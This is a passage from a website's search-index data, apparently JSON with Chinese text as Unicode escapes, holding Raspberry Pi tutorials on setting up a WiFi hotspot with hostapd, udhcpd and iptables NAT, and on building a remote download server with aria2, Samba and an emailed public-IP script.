\u7f16\u8f91\u7f51\u5361\u914d\u7f6e\u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #allow-hotplug wlan0 #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u52a0\u4e0a\u4e0b\u9762\u8fd9\u6bb5\u6865\u63a5\u914d\u7f6e\uff1a auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 \u6700\u7ec8\u7684\u914d\u7f6e\u4e3b\u8981\u7531\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u7ec4\u6210\uff1a #loopback adapter auto lo iface lo inet loopback #wired adapter iface eth0 inet dhcp #bridge auto br0 iface br0 inet dhcp bridge_ports eth0 wlan0 3.3 \u914d\u7f6ehostapd sudo nano /etc/hostapd/hostapd.conf \u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv bridge=br0 ssid=My_SSID_Name channel=1 wmm_enabled=0 wpa=1 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP auth_algs=1 macaddr_acl=0 \u914d\u7f6e\u6587\u4ef6\u5177\u4f53\u6211\u5c31\u4e0d\u8bf4\u4e86\uff0c\u60f3\u5fc5\u5927\u5bb6\u770b\u5185\u5bb9\u4e5f\u77e5\u9053\u5404\u9879\u7684\u542b\u4e49\uff0c\u4fdd\u5b58\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u3002 3.4 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" \u6865\u63a5\u65b9\u5f0f\u914d\u7f6e\u5b8c\u6210\uff01 4. \u8def\u7531\u7684\u65b9\u5f0f\u8bbe\u7f6eWiFi\u70ed\u70b9\uff08\u65b9\u6848\u4e8c\uff09 4.1 \u5b89\u88c5\u5fc5\u5907\u7a0b\u5e8f sudo apt-get install udhcpd udhcpd\u4e3b\u8981\u4e3a\u8fde\u63a5\u5230WiFi\u7684\u8bbe\u5907\u81ea\u52a8\u5206\u914dIP\u5730\u5740\u7684\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u6362\u7528\u4f60\u6240\u719f\u6089\u7684\u8f6f\u4ef6\u3002 4.2 \u914d\u7f6eudhcpd\uff0c\u7f16\u8f91 /etc/udhcpd.conf \uff0c\u4e3b\u8981\u5185\u5bb9\u5982\u4e0b\uff1a start 192.168.42.2 # This is the range of IPs that the hostspot will give to client devices. end 192.168.42.20 interface wlan0 # The device uDHCP listens on. remaining yes opt dns 8.8.8.8 4.2.2.2 # The DNS servers client devices will use. opt subnet 255.255.255.0 opt router 192.168.42.1 # The Pi's IP address on wlan0 which we will set up shortly. opt lease 864000 # 10 day DHCP lease time in seconds \u63a5\u4e0b\u6765\u7f16\u8f91 /etc/default/udhcpd \u5e76\u4e14\u5c06\u4e0b\u9762\u8fd9\u884c\u6ce8\u91ca\u6389\uff0c\u4ee5\u4f7fDHCP Server\u6b63\u5e38\u5de5\u4f5c\uff1a #DHCPD_ENABLED=\"no\" 4.3 \u914d\u7f6e\u65e0\u7ebf\u7f51\u5361 \u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u7ed9\u65e0\u7ebf\u7f51\u5361\u8bbe\u7f6e\u4e00\u4e2aIP\u5730\u5740\uff1a sudo ifconfig wlan0 192.168.42.1 \u5f53\u7136\u4e3a\u4e86\u4e0b\u6b21\u542f\u52a8\u4ecd\u7136\u6709\u6548\uff0c\u6211\u4eec\u9700\u8981\u914d\u7f6e /etc/network/interfaces \u6587\u4ef6\uff1a sudo nano /etc/network/interfaces \u6ce8\u91ca\u6389\u6240\u6709\u7684\u5173\u4e8e\u65e0\u7ebf\u7f51\u5361\u7684\u90e8\u5206\uff0c\u6700\u540e\u5e94\u8be5\u53d8\u6210\u4e0b\u9762\u6240\u793a\uff1a #wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf #iface default inet dhcp \u6ce8\u610f\u4fdd\u7559 allow-hotplug wlan0 \uff0c\u82f1\u6587\u539f\u6587\u662f\u4e0d\u4fdd\u7559\u7684\uff0c\u4f46\u662f\u6211\u64cd\u4f5c\u4e0b\u6765\u53d1\u73b0\u5982\u679c\u4e0d\u4fdd\u7559\u8fd9\u6bb5\u7684\u8bdd\uff0c\u65e0\u7ebf\u7f51\u5361\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u914d\u7f6eIP\uff0c\u6700\u540e\u65e0\u7ebf\u7f51\u5361IP\u7684\u914d\u7f6e\u4fe1\u606f\u5982\u4e0b\uff1a allow-hotplug wlan0 iface wlan0 inet static address 192.168.42.1 netmask 255.255.255.0 4.4 \u7f16\u8f91hostapd\u914d\u7f6e sudo nano /etc/hostapd/hostapd.conf \u5185\u5bb9\u5982\u4e0b\uff1a interface=wlan0 driver=rtl871xdrv ssid=My_SSID_Name hw_mode=g channel=6 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=MYPASSWORD wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 4.7 \u542f\u52a8IP\u8f6c\u5411\u529f\u80fd\u4ee5\u4fbf\u4e8e\u5f00\u901aNAT sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\" \u7f16\u8f91 /etc/sysctl.conf \u6539\u52a8\u4e0b\u9762\u8fd9\u884c\uff1a net.ipv4.ip_forward=1 4.8 \u914d\u7f6eiptables\u9632\u706b\u5899 sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT \u5230\u8fd9\u91cc\u8def\u7531\u7684NAT\u529f\u80fd\u5df2\u7ecf\u88ab\u542f\u7528\uff0c\u6211\u4eec\u5c06\u521a\u624d\u914d\u7f6e\u7684iptables\u4fdd\u5b58\u4e0b\u6765\u4ee5\u4fbf\u4e8e\u4e0b\u6b21\u4f7f\u7528\uff1a sudo sh -c \"iptables-save > /etc/iptables.ipv4.nat\" \u7f16\u8f91 /etc/network/interfaces \u7136\u540e\u5728\u6700\u540e\u52a0\u4e0a\u4e0b\u9762\u8fd9\u884c\u4ee5\u4f7f\u6bcf\u6b21\u542f\u52a8\u90fd\u81ea\u52a8\u52a0\u8f7diptables\u914d\u7f6e\uff1a up iptables-restore < /etc/iptables.ipv4.nat 4.9 \u91cd\u542f\u5e76\u6d4b\u8bd5hostapd sudo reboot \u91cd\u542f\u5b8c\u6210\u540e\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6d4b\u8bd5\u662f\u5426\u6b63\u786e\uff1a sudo hostapd -dd /etc/hostapd/hostapd.conf \u5982\u679c\u6ca1\u6709\u9519\u8bef\u7684\u8bdd\uff0c\u4f60\u8fd9\u65f6\u5e94\u8be5\u80fd\u641c\u7d22\u5230\u4f60\u6240\u914d\u7f6e\u7684\u65e0\u7ebf\u4fe1\u53f7\u3002\u7136\u540eCtrl+C\u9000\u51fa\u8fd9\u4e2a\u6d4b\u8bd5\u3002 \u5982\u679c\u4e00\u5207\u6b63\u5e38\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6ehostapd\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u4e86\u3002 sudo nano /etc/default/hostapd \u53bb\u6389\u6ce8\u91ca\u7b26\u53f7\u5e76\u6539\u52a8\u4e0b\u9762\u8fd9\u884c\u4e3a\u6211\u4eec\u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 4.10 \u542f\u52a8\u76f8\u5e94\u8f6f\u4ef6\uff0c\u5e76\u52a0\u5165\u542f\u52a8\u9879 sudo service hostapd start sudo service udhcpd start sudo update-rc.d hostapd enable sudo update-rc.d udhcpd enable 2013\u5e7412\u670812\u65e5\u66f4\u65b0 \u6700\u8fd1\u7ecf\u5e38\u53d1\u73b0\u65e0\u7ebf\u7f51\u5361\u914d\u7f6e\u7684DHCP\u4e0d\u80fd\u53d1\u6325\u4f5c\u7528\uff0c\u7ecf\u8fc7\u6392\u67e5\u53d1\u73b0\u7ed9\u65e0\u7ebf\u7f51\u5361\u6307\u5b9a\u7684\u9759\u6001IP\u5931\u8d25\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\u65e0\u7ebf\u7f51\u5361\u6ca1\u6709IP\u5bfc\u81f4DHCP\u65e0\u6cd5\u5de5\u4f5c\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u8fd9\u7bc7\u6587\u7ae0 \u300aWhy won't dnsmasq's DHCP server work when using hostapd?\u300b \uff0c\u6839\u636e\u5185\u5bb9\u6211\u5c06 /etc/default/ifplugd \u7684\u5185\u5bb9\u4fee\u6539\u914d\u7f6e\u5982\u4e0b\uff1a INTERFACES=\"eth0\" HOTPLUG_INTERFACES=\"eth0\" ARGS=\"-q -f -u0 -d10 -w -I\" SUSPEND_ACTION=\"stop\" \u91cd\u542f\u4e86\u51e0\u6b21\u8fdb\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e00\u5207\u6b63\u5e38\uff01 \u539f\u6587\u94fe\u63a5\uff1a https://wangye.org/blog/archives/845/","title":"\u5c06\u6811\u8393\u6d3eRaspberry Pi\u8bbe\u7f6e\u4e3a\u65e0\u7ebf\u8def\u7531\u5668(WiFi\u70ed\u70b9AP,RTL8188CUS\u82af\u7247)"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/","text":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09 \u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09 \u6811\u8393\u6d3e\u4e70\u56de\u6765\u540e\u5e72\u4ec0\u4e48\u5462\uff1f\u5148\u9a71\u4eec\u544a\u8bc9\u6211\uff1a\u73a9\u51e0\u5929\u5c31\u817b\u4e86\uff0c\u7b49\u7740\u653e\u7284\u89d2\u65ee\u65ef\u91cc\u5403\u7070\u5427\u3002 \u6211\u7814\u7a76\u4e86\u77e5\u4e4e\u4e0a\u7684 \u6811\u8393\u6d3e\u73a9\u6cd5\u5927\u5168 \uff0c\u53d1\u73b0\u5982\u679c\u6ca1\u6709\u4e70\u5176\u4ed6\u6269\u5c55\u786c\u4ef6\u7684\u8bdd\uff0c\u7528\u6811\u8393\u6d3e\u642d\u5efa\u4e00\u4e2a24\u5c0f\u65f6\u5f00\u673a\u7684\u4e0b\u8f7d\u670d\u52a1\u5668\u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002 \u9047\u5230\u7684\u96be\u70b9\u548c\u89e3\u51b3\u529e\u6cd5 \u65e2\u7136\u662f\u4e0b\u8f7d\u670d\u52a1\u5668\u5c31\u4e0d\u80fd\u53ea\u5728\u5bb6\u91cc\u4f7f\u7528\uff0c\u9700\u8981\u652f\u6301\u8fdc\u7a0b\u8bbf\u95ee\u3002\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u76ee\u524d\u5bb6\u91cc\u5b89\u88c5\u7684\u90fd\u662f\u8054\u901a\u7684ADSL\uff0c\u516c\u7f51IP\u662f\u7ecf\u5e38\u53d1\u751f\u53d8\u5316\u7684\uff0c\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u5bb6\u91cc\u6811\u8393\u6d3e\u7684IP\u5730\u5740\u8fdb\u884c\u8bbf\u95ee\u5462\uff1f \u89e3\u51b3\u529e\u6cd5\u5982\u4e0b\uff1a \u9996\u5148\u767b\u5f55\u5bb6\u91cc\u7684\u8def\u7531\u5668\uff0c\u7ed9\u6811\u8393\u6d3e\u6307\u5b9a\u4e00\u4e2a\u56fa\u5b9a\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \ufffc \u4f7f\u7528\u8def\u7531\u5668\u91cc\u7684DHCP\u9759\u6001IP\u5206\u914d\u529f\u80fd\u6307\u5b9aIP\u5730\u5740\uff08\u57fa\u672c\u6240\u6709\u8def\u7531\u5668\u90fd\u6709\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f46\u83dc\u5355\u4f4d\u7f6e\u4e0d\u4e00\u6837\uff09 \u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86192.168.31.88 \u4f5c\u4e3a\u6811\u8393\u6d3e\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \u7136\u540e\u5f00\u542f\u8def\u7531\u5668\u91cc\u7684DMZ\u529f\u80fd\uff0c\u6307\u5411\u8fd9\u4e2a\u9759\u6001IP\u5730\u5740\uff0c\u8fd9\u6837\u901a\u8fc7\u516c\u7f51IP\u5c31\u80fd\u8bbf\u95ee\u5230\u6811\u8393\u6d3e\u4e86\u3002 \ufffc\ufffc \u90a3\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u516c\u7f51\u5730\u5740\u5462\uff1f \u5199\u4e86\u4e0b\u9762\u4e00\u6bb5Python\u4ee3\u7801\uff0c\u5b9e\u73b0\u7684\u65b9\u6cd5\u662f\uff1a \u901a\u8fc7\u8bbf\u95ee\u91c7\u96c6 http://members.3322.org/dyndns/getip \u83b7\u53d6\u5230\u516c\u7f51IP\u5730\u5740\uff0c\u7136\u540e\u501f\u7528163\u90ae\u7bb1\u7ed9\u81ea\u5df1\u7684QQ\u90ae\u7bb1\u53d1\u4fe1\u3002\uff08\u53d1\u4ef6\u548c\u6536\u4ef6\u90ae\u7bb1\u4e00\u81f4\u4e5f\u53ef\u4ee5\uff0c\u4e3b\u8981\u8003\u8651163\u90ae\u7bb1\u8bbe\u7f6eSMTP\u65b9\u4fbf\uff0cQQ\u53ef\u4ee5\u81ea\u52a8\u5f39\u51fa\u90ae\u4ef6\u901a\u77e5\u3002\uff09 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib import string from email.MIMEMultipart import MIMEMultipart from email.MIMEText import MIMEText import urllib import urllib2 user_agent = 'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT)' headers = {} headers['User-Agent'] = user_agent url = 'http://members.3322.org/dyndns/getip' # \u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u83b7\u53d6\u516c\u7f51IP\u5730\u5740 req = urllib2.Request(url, headers = headers) res = urllib2.urlopen(req) ip = string.strip(res.read()) # \u53bb\u9664\u7a7a\u683c print ip fromaddr = \"xiangyangqiaomu@163.com\" # \u586b\u5199\u4f60\u7684\u53d1\u4fe1\u90ae\u7bb1\uff0c\u6211\u9009\u7528\u7684\u662f163\u90ae\u7bb1 toaddr = \"85378058@qq.com\" # \u586b\u5199\u4f60\u7684\u6536\u4fe1\u5730\u5740\uff0c\u63a5\u6536\u6811\u8393\u6d3e\u7684\u516c\u7f51IP\u5730\u5740 msg = MIMEMultipart() msg['From'] = fromaddr msg['To'] = toaddr msg['Subject'] = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u6807\u9898 body = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u5185\u5bb9\uff0c\u540c\u6807\u9898\uff08\u5077\u61d2\uff09 msg.attach(MIMEText(body, 'plain')) server = smtplib.SMTP('smtp.163.com', 25) # \u586b\u5199163\u90ae\u7bb1\u7684\u53d1\u4fe1\u670d\u52a1\u5668\u5730\u5740 server.starttls() server.login(fromaddr, \"xxx\") # xxx\u4ee3\u8868\u4f60\u7684\u90ae\u4ef6\u767b\u5f55\u5bc6\u7801 text = msg.as_string() server.sendmail(fromaddr, toaddr, text) # \u5f00\u59cb\u53d1\u90ae\u4ef6 print u\"send ok\" # \u53d1\u9001\u6210\u529f\u63d0\u793a server.quit() \u8fd0\u884c\u8fd9\u4e2apython\u6587\u4ef6\u540e\u5c31\u53d1\u4fe1\u6210\u529f\u4e86\u3002\uff08\u6ce8\u610f\uff0c\u5343\u4e07\u4e0d\u8981\u628a\u8fd9\u4e2apython\u6587\u4ef6\u547d\u540d\u4e3aemail.py\uff0c\u4f1a\u62a5\u9519\uff0c\u6362\u4e2a\u540d\u5b57\uff0c\u6bd4\u5982\u53ebsendemail.py\uff09 \ufffc \u5982\u4f55\u5b9a\u65f6\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u53d1\u90ae\u4ef6\u5462\uff1f \u9700\u8981\u5148\u5199\u4e00\u4e2a\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u811a\u672c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a #!/bin/sh python /home/pi/code/sendemail.py \u5b58\u4e2a\u540d\u5b57\u53eb getip.sh \u5728\u6811\u8393\u6d3e\u7684\u7ec8\u7aef\u91cc\u8f93\u5165 crontab -e \u8fd9\u4e2a\u662f\u7cfb\u7edf\u81ea\u5e26\u7684\u5b9a\u65f6\u7a0b\u5e8f\uff0c\u5177\u4f53\u7528\u6cd5\u53ef\u4ee5Google \u8fd9\u65f6\u4f1a\u8fdb\u5165\u7f16\u8f91\u754c\u9762\uff0c\u8f93\u5165\u5982\u4e0b\u4ee3\u7801\uff08\u610f\u601d\u662f\u6bcf\u969430\u5206\u949f\u6267\u884c\u4e00\u6b21getip.sh\u8fd9\u4e2a\u811a\u672c\uff09 */30 * * * * /home/pi/code/getip.sh \u8fd9\u6837\uff0c\u6bcf\u969430\u5206\u949f\u4f60\u7684\u90ae\u7bb1\u91cc\u5c31\u4f1a\u6709\u4e00\u5c01\u544a\u77e5\u4f60\u73b0\u5728\u6811\u8393\u6d3e\u516c\u7f51IP\u7684\u90ae\u4ef6\u3002 \u5982\u4f55\u6539\u9020\u6210\u4e0b\u8f7d\u673a\u5462\uff1f \u6709\u4e86\u516c\u7f51IP\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u901a\u8fc7SSH\u767b\u5f55\u5230\u6811\u8393\u6d3e\u4e3b\u673a\u4e86\uff0c\u53ef\u5982\u4f55\u53d8\u6210\u4e0b\u8f7d\u673a\u5462\uff1f \u8fd9\u65f6Linux\u4e0b\u6700\u5f3a\u5927\u7684\u4e0b\u8f7d\u5de5\u5177Aria2\u5c31\u8981\u51fa\u573a\u4e86\u3002 \u636e\u8bf4\u53ef\u4ee5\u4e0b\u8f7d\u767e\u5ea6\u4e91\uff0c\u8fc5\u96f7\u79bb\u7ebf\u4e2d\u7684\u8d44\u6e90\uff0c\u652f\u6301http/https/ftp/bt\u534f\u8bae\uff0c\u652f\u6301metalink 3.0\uff0cmetalink\u662f\u4e00\u79cd\u53ef\u4ee5\u5c06\u4e0d\u540c\u534f\u8bae\u4e0b\u8f7d\u7684\u540c\u4e00\u6587\u4ef6\u96c6\u5408\u5230\u4e00\u8d77\u4ee5\u8fbe\u5230\u6700\u5927\u4e0b\u8f7d\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u7684\u4e1c\u897f\u3002 \u5b89\u88c5\u914d\u7f6e\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1a Raspberry Pi\u4ece\u96f6\u5f00\u59cb\u642d\u5efa\u4f4e\u6210\u672cNAS(7)-Aria2\u8fdc\u7a0b\u4e0b\u8f7d \u6309\u7167\u6b65\u9aa4\u4e00\u6b65\u6b65\u64cd\u4f5c\uff0c\u6bd4\u8f83\u987a\u5229\u3002 \u6700\u540e\u8fd8\u5b89\u88c5\u4e86webui-aria2\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7Web\u754c\u9762\u65b9\u5f0f\u6dfb\u52a0\u4e0b\u8f7d\u4efb\u52a1\u4e86\u3002 \u6ce8\u610f\uff1aWeb\u670d\u52a1\u5668\u53ef\u4ee5\u9009\u62e9Apache\u6216Nginx\u90fd\u53ef\u4ee5\uff0c\u4f46\u914d\u7f6e\u7aef\u53e3\u7684\u65f6\u5019\u4e00\u5b9a\u4e0d\u8981\u752880\u62168080\uff0c\u56e0\u4e3a\u90fd\u88ab\u8054\u901a\u5c01\u6389\u4e86\u3002 \ufffc \u70b9\u51fb\u6dfb\u52a0\u5c31\u53ef\u4ee5\u521b\u5efa\u4e0d\u540c\u534f\u8bae\u7684\u4e0b\u8f7d\u4efb\u52a1\uff0chttp/ftp\u548c\u78c1\u529b\u94fe\u90fd\u9009\u94fe\u63a5\u4e0b\u8f7d\uff0c\u4e5f\u53ef\u4ee5\u4e0a\u4f20BT\u79cd\u5b50\u4e0b\u8f7d\u3002 \u7535\u5f71\u4e0b\u8f7d\u63a8\u8350: LOL\u7535\u5f71\u5929\u5802 \u8ba9\u95f2\u7f6e\u7684\u79fb\u52a8\u786c\u76d8\u8dd1\u8d77\u6765 \u6811\u8393\u6d3e\u7684\u7cfb\u7edf\u662f\u5b89\u88c5\u5728SD\u5361\u91cc\uff0c\u5bb9\u91cf\u53ea\u670932G\uff0c\u901f\u5ea6\u4e5f\u4e0d\u5feb\u3002\u521a\u597d\u60f3\u8d77\u6765\u6211\u8fd8\u6709\u5757\u95f2\u7f6e\u4e86\u5feb10\u5e74\u7684500G\u79fb\u52a8\u786c\u76d8\u3002 \u770b\u4e86\u5f88\u591a\u6587\u7ae0\u90fd\u8bf4\u6811\u8393\u6d3e\u5e26\u4e0d\u8d77\u6765\u79fb\u52a8\u786c\u76d8\uff0c\u56e0\u4e3a\u7535\u538b\u4e0d\u591f\uff0c\u9700\u8981\u5916\u63a5\u7535\u6e90\u6216\u4f7f\u7528\u5e26\u7535\u6e90\u7684USB Hub\u3002 \u4f46\u6211\u5c1d\u8bd5\u628a\u79fb\u52a8\u786c\u76d8\u63d2\u4e0a\u53bb\u7684\u65f6\u5019\uff0c\u5c45\u7136\u53ef\u4ee5\u8bc6\u522b\u800c\u4e14\u8fd0\u8f6c\u826f\u597d\u3002\u53ef\u80fd\u6811\u8393\u6d3e3b+\u5347\u7ea7\u4e86\uff1f \u53c2\u8003\u6559\u7a0b\u5b89\u88c5\u4e86Samba\u4ee5\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab\uff1a http://www.cnblogs.com/xiaowuyi/p/4051238.html \u6ce8\u610f\u4e8b\u9879\uff1a \u5efa\u8bae\u628a\u79fb\u52a8\u786c\u76d8\u7684\u67d0\u4e2a\u5206\u533a\u683c\u5f0f\u5316\u4e3aext4\u683c\u5f0f\uff0c\u5426\u5219aria2\u4e0b\u8f7d\u65e0\u6cd5\u5199\u5165\u3002 \u5982\u679c\u6709\u5206\u533a\u662fNTFS\u683c\u5f0f\u7684\uff0c\u9700\u8981\u88c5\u8f6f\u4ef6 sudo apt-get install fuse-utils ntfs-3g \u5426\u5219\u5206\u533a\u662f\u53ea\u8bfb\u72b6\u6001\u3002 \u63d2\u4e0a\u53bb\u79fb\u52a8\u786c\u76d8\u6216U\u76d8\u662f\u4e0d\u80fd\u76f4\u63a5\u7528\u7684\uff0c\u9700\u8981\u6302\u8f7d\u3002 \u6559\u7a0b\u5730\u5740 \u5b89\u88c5\u8bbe\u7f6e\u597dSamba\u670d\u52a1\u540e\uff0c\u7535\u8111\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u5230\u79fb\u52a8\u786c\u76d8\u4e86\u3002 \u5982\u679c\u662fMac\u7535\u8111\uff0c\u6253\u5f00Finder -> \u524d\u5f80 -> \u8fde\u63a5\u670d\u52a1\u5668\uff0c\u7136\u540e\u8f93\u5165 smb://user@xxx.xxx.xxx.xxx \u8fd9\u65f6\u4f1a\u8981\u6c42\u8f93\u5165smba\u7528\u6237\u5bc6\u7801\uff0c\u7136\u540e\u5c31\u767b\u5f55\u6210\u529f\u4e86\uff0c\u4ee5\u540e\u8fdc\u7a0b\u5c31\u53ef\u4ee5\u8bbf\u95ee\u81ea\u5df1\u7684\u79fb\u52a8\u786c\u76d8\u4e86\uff0c\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u64ad\u653e\u89c6\u9891\u3002 \u200b \u7f16\u8f91\u4e8e 2016-07-02 01:35 \u6811\u8393\u6d3e\uff08Raspberry Pi\uff09 Python \u5165\u95e8 \u6781\u5ba2\uff08Geek\uff09 \u200b\u8d5e\u540c 682\u200b\u200b62 \u6761\u8bc4\u8bba\u200b\u5206\u4eab\u200b\u559c\u6b22\u200b\u6536\u85cf\u200b\u7533\u8bf7\u8f6c\u8f7d\u200b \u539f\u6587\u94fe\u63a5\uff1a https://zhuanlan.zhihu.com/p/21471896","title":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#24","text":"","title":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#24_1","text":"\u6811\u8393\u6d3e\u4e70\u56de\u6765\u540e\u5e72\u4ec0\u4e48\u5462\uff1f\u5148\u9a71\u4eec\u544a\u8bc9\u6211\uff1a\u73a9\u51e0\u5929\u5c31\u817b\u4e86\uff0c\u7b49\u7740\u653e\u7284\u89d2\u65ee\u65ef\u91cc\u5403\u7070\u5427\u3002 \u6211\u7814\u7a76\u4e86\u77e5\u4e4e\u4e0a\u7684 \u6811\u8393\u6d3e\u73a9\u6cd5\u5927\u5168 \uff0c\u53d1\u73b0\u5982\u679c\u6ca1\u6709\u4e70\u5176\u4ed6\u6269\u5c55\u786c\u4ef6\u7684\u8bdd\uff0c\u7528\u6811\u8393\u6d3e\u642d\u5efa\u4e00\u4e2a24\u5c0f\u65f6\u5f00\u673a\u7684\u4e0b\u8f7d\u670d\u52a1\u5668\u662f\u4e2a\u4e0d\u9519\u7684\u9009\u62e9\u3002","title":"\u628a\u6811\u8393\u6d3e\u53d8\u621024\u5c0f\u65f6\u8fd0\u884c\u7684\u4e0b\u8f7d\u795e\u5668\uff08\u79cd\u5b50\u3001\u78c1\u529b\u94fe\u901a\u901a\u652f\u6301\uff09"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_1","text":"\u65e2\u7136\u662f\u4e0b\u8f7d\u670d\u52a1\u5668\u5c31\u4e0d\u80fd\u53